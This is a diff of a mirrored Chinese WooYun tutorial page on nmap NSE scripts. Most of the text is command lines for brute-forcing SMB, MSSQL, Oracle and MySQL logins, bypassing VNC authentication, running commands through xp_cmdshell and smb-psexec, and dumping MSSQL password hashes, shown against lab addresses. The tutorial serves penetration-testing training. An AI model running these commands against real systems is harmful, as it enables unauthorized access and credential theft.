@@ -3,14 +3,14 @@
 			<head>
 			     <title>nmap脚本使用总结 - clzzy</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/2188">http://drops.wooyun.org/tips/2188</a></h1>
 				
       <p>
-        <h2>0x00 前言：</h2>
+        </p><h2>0x00 前言：</h2>
 
-<hr />
+<hr>
 
 <p>nmap的基本介绍和基本使用方法，在乌云知识库中已经有人提交过，讲的比较详细，在此文中就不再讲述。 具体链接：<a href="http://drops.wooyun.org/tips/2002">http://drops.wooyun.org/tips/2002</a></p>
 
@@ -18,11 +18,11 @@
 
 <h2>0x01 nmap按脚本分类扫描</h2>
 
-<hr />
+<hr>
 
 <p>nmap脚本主要分为以下几类，在扫描时可根据需要设置--script=类别这种方式进行比较笼统的扫描：</p>
 
-<hr />
+<hr>
 
 <pre><code>auth: 负责处理鉴权证书（绕开鉴权）的脚本  
 broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  
@@ -47,49 +47,49 @@ vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是�
 
 <p>负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</p>
 
-<p><img src="http://static.wooyun.org/201406/2014060615534754396.jpg" alt="2014060615534754396.jpg" /></p>
+<p><img src="../images_result/images/2014060615534754396.jpg" alt="2014060615534754396.jpg"></p>
 
-<p><img src="http://static.wooyun.org/201406/2014060615542724331.jpg" alt="2014060615542724331.jpg" /></p>
+<p><img src="../images_result/images/2014060615542724331.jpg" alt="2014060615542724331.jpg"></p>
 
 <p>（2）<code>nmap --script=brute 192.168.137.*</code></p>
 
 <p>提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解</p>
 
-<p><img src="http://static.wooyun.org/201406/2014060615563891852.jpg" alt="2014060615563891852.jpg" /></p>
+<p><img src="../images_result/images/2014060615563891852.jpg" alt="2014060615563891852.jpg"></p>
 
 <p>（3）<code>nmap --script=default 192.168.137.*</code> 或者 <code>nmap -sC 192.168.137.*</code></p>
 
 <p>默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</p>
 
-<p><img src="http://static.wooyun.org/201406/2014060615573246791.jpg" alt="2014060615573246791.jpg" /></p>
+<p><img src="../images_result/images/2014060615573246791.jpg" alt="2014060615573246791.jpg"></p>
 
-<p><img src="http://static.wooyun.org/201406/2014060615575272523.jpg" alt="2014060615575272523.jpg" /></p>
+<p><img src="../images_result/images/2014060615575272523.jpg" alt="2014060615575272523.jpg"></p>
 
 <p>（4）<code>nmap --script=vuln 192.168.137.*</code>    </p>
 
 <p>检查是否存在常见漏洞</p>
 
-<p><img src="http://static.wooyun.org/201406/2014060615585424517.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014060615585424517.jpg" alt="enter image description here"></p>
 
-<p><img src="http://static.wooyun.org/201406/2014060615591092492.jpg" alt="2014060615591092492.jpg" /></p>
+<p><img src="../images_result/images/2014060615591092492.jpg" alt="2014060615591092492.jpg"></p>
 
-<p><img src="http://static.wooyun.org/201406/2014060615595719894.jpg" alt="2014060615595719894.jpg" /></p>
+<p><img src="../images_result/images/2014060615595719894.jpg" alt="2014060615595719894.jpg"></p>
 
 <p>（5）<code>nmap -n -p445 --script=broadcast 192.168.137.4</code></p>
 
 <p>在局域网内探查更多服务开启状况</p>
 
-<p><img src="http://static.wooyun.org/201406/2014060616014785663.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014060616014785663.jpg" alt="enter image description here"></p>
 
 <p>（6）<code>nmap --script external 202.103.243.110</code> </p>
 
 <p>利用第三方的数据库或资源，例如进行whois解析</p>
 
-<p><img src="http://static.wooyun.org/201406/2014060616023053772.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014060616023053772.jpg" alt="enter image description here"></p>
 
 <h2>0x02 nmap按应用服务扫描</h2>
 
-<hr />
+<hr>
 
 <p>（1）vnc扫描：</p>
 
@@ -99,9 +99,9 @@ vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是�
 nmap  --script=realvnc-auth-bypass 192.168.137.4  
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616053748232.jpg" alt="2014060616053748232.jpg" /></p>
+<p><img src="../images_result/images/2014060616053748232.jpg" alt="2014060616053748232.jpg"></p>
 
-<p><img src="http://static.wooyun.org/201406/2014060616051988850.jpg" alt="2014060616051988850.jpg" /></p>
+<p><img src="../images_result/images/2014060616051988850.jpg" alt="2014060616051988850.jpg"></p>
 
 <p>检查vnc认证方式</p>
 
@@ -129,7 +129,7 @@ nmap  --script=smb-brute.nse 192.168.137.4  
 nmap --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4  
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616291538718.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014060616291538718.jpg" alt="enter image description here"></p>
 
 <p>smb已知几个严重漏</p>
 
@@ -137,7 +137,7 @@ nmap --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 
 nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4    
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616100977307.jpg" alt="2014060616100977307.jpg" /></p>
+<p><img src="../images_result/images/2014060616100977307.jpg" alt="2014060616100977307.jpg"></p>
 
 <p>查看共享目录  </p>
 
@@ -151,7 +151,7 @@ nmap -p 445  --script smb-ls --script-args ‘share=e$,path=\,smbuser=test,smbp
 nmap -p 445 -n –script=smb-psexec --script-args= smbuser=test,smbpass=test 192.168.137.4   
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616105133511.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014060616105133511.jpg" alt="enter image description here"></p>
 
 <p>查看会话</p>
 
@@ -173,7 +173,7 @@ nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=test,smbpass=t
 nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4    
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616135770347.jpg" alt="2014060616135770347.jpg" /></p>
+<p><img src="../images_result/images/2014060616135770347.jpg" alt="2014060616135770347.jpg"></p>
 
 <p>xp_cmdshell 执行命令 </p>
 
@@ -181,7 +181,7 @@ nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/p
 nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user" 192.168.137.4       
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616145120758.jpg" alt="2014060616145120758.jpg" /></p>
+<p><img src="../images_result/images/2014060616145120758.jpg" alt="2014060616145120758.jpg"></p>
 
 <p>dumphash值</p>
 
@@ -189,7 +189,7 @@ nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.p
 nmap -p 1433 --script ms-sql-dump-hashes.nse --script-args mssql.username=sa,mssql.password=sa  192.168.137.4      
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616162575059.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014060616162575059.jpg" alt="enter image description here"></p>
 
 <p>（4）Mysql扫描：</p>
 
@@ -199,7 +199,7 @@ nmap -p 1433 --script ms-sql-dump-hashes.nse --script-args mssql.username=sa,mss
 nmap -p3306 --script=mysql-empty-password.nse 192.168.137.4   
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616171069963.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014060616171069963.jpg" alt="enter image description here"></p>
 
 <p>列出所有mysql用户</p>
 
@@ -213,7 +213,7 @@ nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4 
 nmap --script=mysql-* 192.168.137.4  
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616274386312.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014060616274386312.jpg" alt="enter image description here"></p>
 
 <p>（5）Oracle扫描：</p>
 
@@ -223,7 +223,7 @@ nmap --script=mysql-* 192.168.137.4  
 nmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5   
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616323173842.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014060616323173842.jpg" alt="enter image description here"></p>
 
 <p>oracle弱口令破解</p>
 
@@ -231,7 +231,7 @@ nmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5  
 nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.137.5      
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201406/2014060616331365615.jpg" alt="enter image description here" /></p>
+<p><img src="../images_result/images/2014060616331365615.jpg" alt="enter image description here"></p>
 
 <p>（6）其他一些比较好用的脚本</p>
 
@@ -253,11 +253,11 @@ nmap --script=samba-vuln-cve-2012-1182  -p 139 192.168.137.4
 
 <p>pcanywhere-brute   同上</p>
 
-<p><img src="http://static.wooyun.org/201406/2014060616350538005.jpg" alt="2014060616350538005.jpg" /></p>
+<p><img src="../images_result/images/2014060616350538005.jpg" alt="2014060616350538005.jpg"></p>
 
 <h2>0x03  学会脚本分析</h2>
 
-<hr />
+<hr>
 
 <p>nmap中脚本并不难看懂，所以在使用时如果不知道原理可以直接看利用脚本即可，也可以修改其中的某些参数方便自己使用。</p>
 
@@ -269,11 +269,11 @@ nmap --script=samba-vuln-cve-2012-1182  -p 139 192.168.137.4
 
 <p>首先是调用破解脚本：</p>
 
-<p><img src="http://static.wooyun.org/201406/2014060616383416251.jpg" alt="2014060616383416251.jpg" /></p>
+<p><img src="../images_result/images/2014060616383416251.jpg" alt="2014060616383416251.jpg"></p>
 
 <p>根据脚本中字典的位置去查看默认字典，当然也可以将破解的字符自行添加其中，或者是修改脚本或参数改变破解字典：</p>
 
-<p><img src="http://static.wooyun.org/201406/2014060616385857682.jpg" alt="2014060616385857682.jpg" /></p>      </p>
+<p><img src="../images_result/images/2014060616385857682.jpg" alt="2014060616385857682.jpg"></p>      <p></p>
     
 			</body>
 		</html>
